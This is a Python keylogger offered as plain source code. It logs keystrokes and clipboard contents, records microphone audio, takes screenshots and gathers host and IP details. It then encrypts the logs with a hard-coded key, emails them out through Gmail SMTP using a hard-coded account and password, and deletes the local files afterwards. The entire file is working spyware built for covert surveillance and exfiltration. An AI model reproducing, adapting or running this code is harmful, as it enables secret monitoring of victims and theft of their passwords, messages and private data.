from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Listener, Key
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab



keys_information = "key_log.txt"
system_info = "systeminfo.txt"
clipboard_information = "clipboard.txt"

screenshot_info = "screenshot.png"
file_path = "C:\\Users\\HP\\PycharmProjects\\KeyLogger"
extend = "\\"
file_merge = file_path+extend


keys_information_e = "e_key_log.txt"
system_info_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

email_address = "loggerkey903@gmail.com"
password = "Keylogger1@"
toaddr = "loggerkey903@gmail.com"
microphone_time = 10
audio_info = "audio.wav"
time_iteration = 15
number_of_iterations_end = 1
key = "nLoJpSBIcrw9gJ_-yC5HNs-XIg2R7niyYFpwa0IulX0="

count = 0
keys = []


def computer_info():
    with open(file_path + extend + system_info, 'a') as f:
        hostname = socket.gethostname()
        IPAddress = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public_ip_Address" + public_ip)

        except Exception:
            f.write("Couldn't get public ip address mostly limit over")

        f.write("\nProcessor : " + (platform.processor()) + '\n')
        f.write("System : " + (platform.system()) + '\n')
        f.write("Machine : " + (platform.machine()) + '\n')
        f.write("Hostname : " + hostname + '\n')
        f.write("Private IP Address : " + IPAddress + '\n\n')


def send_email(filename, attachment, toaddr):
    filename = filename
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    body = "body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-disposition', "attachment; filename=%s" % filename)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)

    s.quit()


computer_info()
#send_email(keys_information, file_path + extend + keys_information, toaddr)

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\nclipboard Data : " + pasted_data + '\n')

        except Exception:
            f.write("Couldn't open clipboard")


def microphone():
    fs = 44100
    seconds = microphone_time
    myrecording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path+extend+audio_info, fs, myrecording)


def screenshot():
    im = ImageGrab.grab()
    im.save(file_path+extend+screenshot_info)



copy_clipboard()
microphone()
screenshot()

number_of_iterations = 0
current_time = time.time()
stopping_time = time.time()+time_iteration

while number_of_iterations < number_of_iterations_end:

    def on_press(key):
        global keys, count, current_time
        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace(",", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()

                elif k.find("key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(file_path+extend+keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_info, file_path+extend+screenshot_info, toaddr)

        copy_clipboard()
        number_of_iterations += 1

        current_time = time.time()
        stopping_time = time.time() + time_iteration

file_to_encrypt = [file_merge+system_info, file_merge+clipboard_information, file_merge+keys_information]

encrypted_filename = [file_merge+system_info_e, file_merge+clipboard_information_e, file_merge+keys_information_e]
filename = [system_info_e, keys_information_e, clipboard_information_e]
for encrypting_file in file_to_encrypt:
    with open(file_to_encrypt[count], "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_filename[count], "wb") as f:
        f.write(encrypted)

    send_email(filename[count], encrypted_filename[count], toaddr)
    count += 1


delete_files = [system_info, clipboard_information, keys_information, screenshot_info, audio_info, keys_information_e, system_info_e, clipboard_information_e]

for file in delete_files:
    os.remove(file_merge+file)



